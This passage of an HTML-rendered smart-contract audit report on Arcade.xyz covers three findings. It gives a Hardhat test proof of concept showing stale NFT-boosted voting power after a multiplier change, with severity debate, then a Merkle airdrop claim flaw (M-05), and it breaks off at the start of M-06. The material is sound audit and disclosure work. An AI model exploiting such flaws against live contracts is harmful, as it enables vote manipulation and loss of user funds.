class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tdeployer = signers[0];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// tree data for two tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let recipientsTokenId = [{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address: alice.address,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                tokenId: 1,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                amount: 1,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let merkleTrieTokenId = await getMerkleTree(recipientsTokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let rootTokenId = merkleTrieTokenId.getHexRoot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let proofAlice = merkleTrieTokenId.getHexProof(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ethers.utils.solidityKeccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                [&quot;address&quot;, &quot;uint256&quot;, &quot;uint256&quot;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                [alice.address, 1, 1],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // deploy descriptor contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        descriptor = &lt;IBadgeDescriptor&gt;await deploy(&quot;BadgeDescriptor&quot;, deployer, [&quot;https://www.domain.com/&quot;]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await descriptor.deployed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Deploy reputation badge</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        reputationBadge = &lt;IReputationBadge&gt;await deploy(&quot;ReputationBadge&quot;, deployer, [deployer.address, descriptor.address]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await reputationBadge.deployed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await reputationBadge.connect(deployer).grantRole(BADGE_MANAGER_ROLE, deployer.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Deployer set expiration time</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let blockchainTime = new BlockchainTime();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let expiration = await blockchainTime.secondsFromNow(3600); // 1 hour</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await reputationBadge.connect(deployer).publishRoots([{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        \ttokenId:1,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        \tclaimRoot: rootTokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        \tclaimExpiration: expiration,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        \tmintPrice: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //Alice mint tokenId</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await reputationBadge.connect(alice).mint(alice.address, 1, 1, 1, proofAlice);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// deploy arcade token distributor</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tarcdDst = &lt;ArcadeTokenDistributor&gt; await deploy(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t&quot;ArcadeTokenDistributor&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tsigners[0],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t[]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tawait arcdDst.deployed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Deploy arcade token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tarcdToken = &lt;ArcadeToken&gt; await deploy(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t&quot;ArcadeToken&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tsigners[0],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t[</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\tdeployer.address,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t\tarcdDst.address</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tawait arcdToken.deployed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// set arcade token as token for arcade distribution</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tawait arcdDst.connect(deployer).setToken(arcdToken.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// mint tokens take tokens from the distributor for use in tests</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tawait arcdDst.connect(deployer).toPartnerVesting(signers[0].address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// transfer tokens to signers and approve locking vault to spend</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tfor (let i = 0; i&lt; signers.length; i++){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tawait arcdToken.connect(deployer).transfer(signers[i].address, ONE.mul(100));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Deploy nft boost vault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tlet staleBlockNum = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tnftBoostVault = &lt;NFTBoostVault&gt;await deploy(&quot;NFTBoostVault&quot;, signers[0], [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            arcdToken.address,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            staleBlockNum,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            deployer.address, // timelock address who can update the manager</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            deployer.address, // manager address who can update multiplier values</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await nftBoostVault.deployed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t});</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tit(&quot;Voting power is not updated after multiplier change&quot;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Add multiplier for reputation badge token id = 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Multiplier is 1400</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tawait nftBoostVault.connect(deployer).setMultiplier(reputationBadge.address,1, 1400);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Confirm that alice is holding the token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\texpect(await reputationBadge.balanceOf(alice.address, 1)).to.equal(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Alice add nft id =1 to nft boost vault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tawait arcdToken.connect(alice).approve(nftBoostVault.address, ONE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tawait reputationBadge.connect(alice).setApprovalForAll(nftBoostVault.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tconst tx = await nftBoostVault.connect(alice).addNftAndDelegate(ONE, 1, reputationBadge.address, alice.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tconst votingPowerBefore = await nftBoostVault.queryVotePowerView(alice.address, tx.blockNumber);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Alice voting power is the amount * multiplier</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\texpect(votingPowerBefore).to.be.eq(ONE.mul(1400).div(MULTIPLIER_DENOMINATOR));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Now the manager reduce the token&#39;s multiplier to 1200</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tawait nftBoostVault.connect(deployer).setMultiplier(reputationBadge.address,1, 1200);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\texpect(await nftBoostVault.getMultiplier(reputationBadge.address, 1), 1200);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Get current block</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tlet blockchainTime = new BlockchainTime();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let nowBlock = await blockchainTime.secondsFromNow(0); // 1 hour</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Alice voting power is unchanged</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tconst votingPowerAfter = await nftBoostVault.queryVotePowerView(alice.address, nowBlock);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\texpect(votingPowerBefore).to.be.eq(votingPowerAfter);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t});</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tasync function getMerkleTree(accounts: Account[]) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t    const leaves = await Promise.all(accounts.map(account =&gt; hashAccount(account)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t    return new MerkleTree(leaves, keccak256Custom, {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t        hashLeaves: false,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t        sortPairs: true,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tasync function hashAccount(account: Account) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t    return ethers.utils.solidityKeccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t        [&quot;address&quot;, &quot;uint256&quot;, &quot;uint256&quot;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t        [account.address, account.tokenId, account.amount],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction keccak256Custom(bytes: Buffer) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t    const buffHash = ethers.utils.solidityKeccak256([&quot;bytes&quot;], [&quot;0x&quot; + bytes.toString(&quot;hex&quot;)]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t    return Buffer.from(buffHash.slice(2), &quot;hex&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span></code></pre>\n</details>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I recommend creating a map of token IDs to a list of users, using that token as a multiplier, and synchronizing their voting power in the function <code>setMultiplier</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/431#issuecomment-1671999101\">PowVT (Arcade.xyz) disagreed with severity, acknowledged and commented via duplicate issue #431</a>:</strong></p>\n<blockquote>\n<p>Should be medium severity. This is a constraint with the current design of the multiplier mechanism. This is the intended functionality. Multiplier voting power is snapshotted at the time of proposal creation, even if a multiplier updates after it was current at the time of proposal creation.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/431#issuecomment-1673301890\">0xean (judge) commented via duplicate issue #431</a>:</strong></p>\n<blockquote>\n<p>Agree on Medium.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/283#issuecomment-1678448375\">0xepley (warden) commented</a>:</strong></p>\n<blockquote>\n<p>This is intentional and by design. I noticed the same issue and then read the following on the details page of code4rena:</p>\n<p><strong>Due to gas constraints, this will not immediately update the voting power of users who are using this NFT for a boost. However, any user’s voting power can be updated by any other user via the <code>updateVotingPower</code> function - this value will look up the current multiplier of the user’s registered NFT and recalculate the boosted voting power. This can be used in cases where obsolete boosts may be influencing the outcome of a vote.</strong></p>\n<p>Given that, it’s unfair to other wardens. Better be Low, in my opinion.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/283#issuecomment-1679111906\">Viktor_Cortess (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xepley - <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/431\">https://github.com/code-423n4/2023-07-arcade-findings/issues/431</a>.</p>\n<p>There is a discussion of this issue. One of the problems with the update mechanism is that nobody knows the addresses of the users whose votes should be updated. So if the user’s multiplier decreases, they can avoid updating their voting power.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/283#issuecomment-1679359025\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>Given that it’s unfair to other wardens. Better be Low, in my opinion.</p>\n</blockquote>\n<p>This isn’t a consideration in the severity of an issue and I think it’s worth highlighting the current design flaw that I think qualifies as Medium.  This could be thought of as a “leak of value” since votes have some value, and this allows for a user to have more votes than expected in some scenarios.  </p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-users-who-have-claimed-before-the-update-on-the-merkle-tree-will-have-no-shares-of-the-rewards-afterward\" style=\"position:relative;\"><a href=\"#m-05-users-who-have-claimed-before-the-update-on-the-merkle-tree-will-have-no-shares-of-the-rewards-afterward\" aria-label=\"m 05 users who have claimed before the update on the merkle tree will have no shares of the rewards afterward permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/213\">[M-05] Users who have claimed before the update on the merkle tree will have no shares of the rewards afterward</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/213\">0x3b</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/353\">osmanozdemir1</a> and <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/219\">T1MOH</a></em></p>\n<p>Users who have claimed before an update on the merkle tree in <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeAirdrop.sol\">ArcadeAirdrop</a> are not going to be able to claim the extra rewards. The reward tokens will be left stuck in the contract, waiting for the manager to reclaim them.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Due to the nature of how <code>ArcadeAirdrop</code> is made and <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeAirdrop.sol#L17-L19\">the expectation</a> that there might be a change in the merkle tree in the near future, users will expect to be able to claim the extra rewards (if they are increased on merkle root change). However, because there is a problematic <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/libraries/ArcadeMerkleRewards.sol#L106-L107\">if stamen</a> (that is inherited in <code>ArcadeAirdrop</code> by <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/libraries/ArcadeMerkleRewards.sol\">ArcadeMerkleRewards</a>) users that have already claimed their rewards will have no share of the future ones.</p>\n<p>Example:</p>\n<ol>\n<li>Alice and Bob both have <strong>100</strong> tokens set to be claimed on the Merkle tree.</li>\n<li>Alice claims their <strong>100</strong> tokens.</li>\n<li>The owner sees that there is a huge activity on the platform and wants to incentivize users, so they increase rewards (by changing the merkle root) to <strong>120</strong> tokens.</li>\n<li>Bob claims their <strong>120</strong> tokens</li>\n<li>Alice sees that and tries to claim the remainder of their <strong>120</strong> tokens (<strong>20</strong>), but the claim reverts because of this <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/libraries/ArcadeMerkleRewards.sol#L106-L107\">if</a></li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalGrant</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleProof</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//@audit if the user has already claimed, he is not able to claim ever again</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AA_AlreadyClaimed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">totalGrant</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the claim implementation the way how <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L98-L120\">mint</a> in <code>ReputationBadge</code> is done. They have the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L110C47-L110C61\">total amount</a> in the merkle tree and track <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L116C1-L116C1\">claimed amount</a> in a mapping.</p>\n<h3 id=\"assessed-type-2\" style=\"position:relative;\"><a href=\"#assessed-type-2\" aria-label=\"assessed type 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>DoS</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/213#issuecomment-1657049529\">__141345__ (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>Invalid if the airdrop is one time.</p>\n<p>Admin’s mistake. If there’s a change in airdrop amount and merkle root, the user can not claim the difference. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/213#issuecomment-1662995520\">PowVT (Arcade.xyz) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-06-arcadetreasurysol-allowance-may-be-overriden\" style=\"position:relative;\"><a href=\"#m-06-arcadetreasurysol-allowance-may-be-overriden\" aria-label=\"m 06 arcadetreasurysol allowance may be overriden permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/85\">[M-06] <code>ArcadeTreasury.sol</code> allowance may be overriden</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/85\">bin2chen</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/535\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/146\">caventa</a>, and <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/55\">0xWaitress</a></em></p>\n<p>Direct use of <code>IERC20(token).approve(spender, amount);</code> causes the same <code>spender</code> allowances to be overridden by each other.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the <code>gscApprove()</code> method, it is possible to give <code>spender</code> a certain 